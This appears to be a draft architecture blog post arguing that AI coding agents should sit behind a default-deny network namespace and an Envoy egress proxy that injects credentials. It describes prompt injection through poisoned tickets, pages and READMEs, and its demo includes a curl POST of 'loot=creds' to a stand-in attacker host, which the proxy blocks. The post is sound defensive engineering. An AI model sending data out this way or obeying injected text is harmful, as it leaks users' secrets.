---
title: "Egress Is the New Perimeter"
date: 2026-07-10
draft: true
categories:
- Architecture
author: Bruno Fernandez-Ruiz
---

Yahoo's edge served over twenty billion requests a day, and I spent years of my career inside that architecture. The company's perimeter was not a firewall diagram; it was a fleet of proxies, machines we owned, and every byte that entered or left crossed one of them. Twenty years later I am building infrastructure to run coding agents safely, and the shape is familiar. The perimeter is a proxy again.

Here is the governing fact. An AI agent is a worker that anyone can talk into anything. That reads like hyperbole and is a plain description of the mechanism: a language model has one input channel, and instructions and data share it. A poisoned ticket, a web page fetched mid-task, a README three dependencies deep; whoever gets text in front of the agent is, for that moment, programming it. The agent has no instinct for social engineering and it acts in seconds.

If that is the mechanism, then three common trust boundaries stop working. The agent's identity cannot be the boundary, because the agent is still itself while executing an attacker's intent; the credential is being exercised by exactly the workload it was issued to. The prompt cannot be the boundary, because a prompt is an instruction to the worker, and we have just established that instructions to this worker are negotiable. And a content scanner cannot be the boundary, because the dangerous action rarely contains a dangerous word; the failure is rarely the forbidden request. It is the permitted one that turns out to be wrong.

The instinct is to harden the system prompt and scan the traffic for secrets. Both help on the margin, and I do both. But a control the agent can read is a control an attacker can rewrite, and a control the agent can talk to will eventually lose the conversation, because the agent is the most persuasive process on the machine. The boundary has to sit where the agent cannot reach it and cannot negotiate with it: below the agent, at the network boundary the host owns.

Your agent's perimeter is not its prompt. It is the egress path the host controls.

That means three properties. Egress is default-deny: the workload has no route to the internet at all, and the only reachable endpoint is a forward proxy on the host side of the boundary. The proxy allowlists destinations and terminates the traffic, so it can inspect what crosses. And credentials are injected at the proxy, on the way out, so the secret never enters the workload's environment. The old model authenticates the workload and hands it the key. The new model never lets the key cross the boundary at all. A compromised agent then has nothing to leak, because nothing was ever there.

None of this requires a product. It is an afternoon of work on a stock Linux box (on a Mac, do it inside a Lima VM) with iproute2, curl, and Envoy.

First, a network namespace whose only exit is a veth pair to the host. No default route, no NAT, no forwarding. The host end of the veth is where the proxy will listen, and it is the only address the sandbox can reach.

```bash
sudo ip netns add agent
sudo ip link add veth-host type veth peer name veth-agent
sudo ip link set veth-agent netns agent
sudo ip addr add 10.200.0.1/24 dev veth-host
sudo ip link set veth-host up
sudo ip netns exec agent ip addr add 10.200.0.2/24 dev veth-agent
sudo ip netns exec agent ip link set veth-agent up
sudo ip netns exec agent ip link set lo up
# belt and braces: even if the host forwards for other reasons, not for this
sudo iptables -A FORWARD -i veth-host -j DROP
```

Note what we did not do: no masquerade rule, no `ip_forward`, no default route inside the namespace. A process in `agent` that tries to reach a public IP gets network-unreachable immediately, and DNS is dead in there too, because no resolver is routable. Name resolution happens at the proxy, outside the sandbox, which is itself a policy decision: the workload does not even get to choose which IP a name resolves to.

Second, the boundary. Envoy listens on the host end of the veth, allows exactly one destination, injects the real credential from its own environment, and answers everything else with a denial:

```yaml
# egress.yaml
static_resources:
  listeners:
  - name: egress
    address:
      socket_address: { address: 10.200.0.1, port_value: 8080 }
    filter_chains:
    - filters:
      - name: envoy.filters.network.http_connection_manager
        typed_config:
          "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
          stat_prefix: egress
          http_protocol_options:
            allow_absolute_url: true
          route_config:
            virtual_hosts:
            - name: github
              domains: ["api.github.com"]
              request_headers_to_add:
              - header:
                  key: authorization
                  value: "Bearer %ENVIRONMENT(GITHUB_TOKEN)%"
                append_action: OVERWRITE_IF_EXISTS_OR_ADD
              routes:
              - match: { prefix: "/" }
                route: { cluster: github }
            - name: deny-everything-else
              domains: ["*"]
              routes:
              - match: { prefix: "/" }
                direct_response:
                  status: 403
                  body: { inline_string: "egress denied by policy\n" }
          http_filters:
          - name: envoy.filters.http.router
            typed_config:
              "@type": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router
  clusters:
  - name: github
    type: LOGICAL_DNS
    dns_lookup_family: V4_ONLY
    load_assignment:
      cluster_name: github
      endpoints:
      - lb_endpoints:
        - endpoint:
            address:
              socket_address: { address: api.github.com, port_value: 443 }
    transport_socket:
      name: envoy.transport_sockets.tls
      typed_config:
        "@type": type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext
        sni: api.github.com
        common_tls_context:
          validation_context:
            trusted_ca:
              filename: /etc/ssl/certs/ca-certificates.crt
```

Two lines in that config are easy to skim and both matter. `allow_absolute_url` tells Envoy to accept the absolute-form request a client sends to a proxy (`GET http://api.github.com/user`) and route on the host inside it; without it Envoy behaves as a reverse proxy and rejects the forward form. The validation context makes the boundary check the upstream certificate against the system trust store, so terminating the agent's plaintext and re-originating TLS to the world is a real TLS client rather than a blind pipe, and that termination is what lets the boundary see what crosses.

The token lives in the proxy's environment on the host, and nowhere else:

```bash
export GITHUB_TOKEN=ghp_your_token_here   # host shell only
envoy -c egress.yaml &
```

Now run the workload. `env -i` strips the environment so there is provably no secret inside, and `http_proxy` is the only capability it gets:

```bash
sudo ip netns exec agent env -i http_proxy=http://10.200.0.1:8080 \
  curl -s http://api.github.com/user
# => your authenticated GitHub user object, as JSON
```

The call is authenticated and the workload never held the credential. Envoy matched the allowlisted host, attached the Authorization header on the way out, and originated TLS from the boundary. Now the exfiltration attempt, an agent trying to POST what it found to a host nobody approved:

```bash
sudo ip netns exec agent env -i http_proxy=http://10.200.0.1:8080 \
  curl -si -X POST -d 'loot=creds' http://exfil.attacker.example/collect
# HTTP/1.1 403 Forbidden
# egress denied by policy
```

And the attempt to go around the proxy entirely:

```bash
sudo ip netns exec agent curl -s --max-time 3 https://api.github.com/user
# curl: (6) Could not resolve host: api.github.com
```

One deliberate omission: this config refuses CONNECT, so the workload cannot open an encrypted tunnel through the boundary. An opaque tunnel through the perimeter defeats the perimeter. The workload speaks plain HTTP across a host-local link that never leaves the machine, and the boundary speaks TLS to the world.

Now the honest edges, because a security argument that will not name its own edges is not worth reading. An allowlisted host is still a channel: if I allow `api.github.com`, an agent can exfiltrate data into a gist, which is why the boundary must inspect and judge actions rather than merely match hostnames, and why the allowlist wants to be as narrow as the task. Domain-level allow is coarse; real deployments want per-route and per-verb policy, and the judgment on permitted-but-wrong actions is a harder problem than this post solves. But notice which class of loss is closed outright: the credential cannot leave, under any prompt, through any channel, because it was never inside. That guarantee is architectural, not behavioural. You do not have to trust the agent's judgment to trust the boundary.

There is a second effect, and it took me a while to see it. Everything an agent needs in order to do real work crosses this one boundary: model calls, tool calls, credentials. So an agent nobody registered still has to come to it. Put a real agent fleet behind one egress and the first thing you learn is what is actually running, because the shadow agent no one approved surfaces as traffic rather than staying invisible. The inventory that security teams are trying to buy as a product falls out of the architecture. Enforcing the policy and taking the census are the same operation.

Zero trust spent twenty years moving the control point off the network and onto identity, and for people that was right: you cannot talk a person's identity out from under them. You can talk an agent's. So for this worker the control point moves back to the network, to a single hop on the host that the workload cannot bypass. Put the credential there instead of inside the agent, and the worst prompt it ever reads has nothing left to carry.
